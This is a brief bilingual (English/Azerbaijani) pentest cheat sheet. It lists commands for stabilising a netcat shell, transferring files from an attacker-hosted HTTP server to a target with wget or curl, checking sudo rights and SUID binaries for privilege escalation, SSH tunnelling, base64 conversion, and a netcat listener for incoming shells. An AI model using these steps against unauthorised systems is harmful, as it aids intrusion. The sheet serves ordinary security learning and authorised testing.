Security Command & Payload Reference

TTY Shell Upgrade (Stabilizasiya)

Netcat üzərindən gələn sadə shell-i tam interaktiv TTY shell-ə çevirmək üçün:

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm && stty raw -echo; fg

Quick File Transfer (Hədəfə Fayl Atmaq)

Yerli maşında HTTP server açmaq:

python3 -m http.server 80

Hədəf maşından faylı çəkmək (Wget / Curl):

wget http://IP/file.txt VƏ YA curl -O http://IP/file.txt

Linux PrivEsc (Sual / Yoxlama)

Sudo hüquqlarını yoxlamaq:

sudo -l

SUID icazəsi olan faylları tapmaq:

find / -perm -4000 2>/dev/null

Port Forwarding (SSH Tunnel)

Uzaq şəbəkə portunu yerli porta yönləndirmək:

ssh -L local_port:target_ip:target_port user@gateway_ip

Base64 Encodings (Terminal)

Mətni Base64-ə çevirmək:

echo -n "text" | base64

Base64 şifrəsini açmaq:

echo "dGV4dA==" | base64 -d

Netcat Listener (Bağlantı Qəbulu)

Port dinləməyə başlamaq:

nc -lvnp 4444
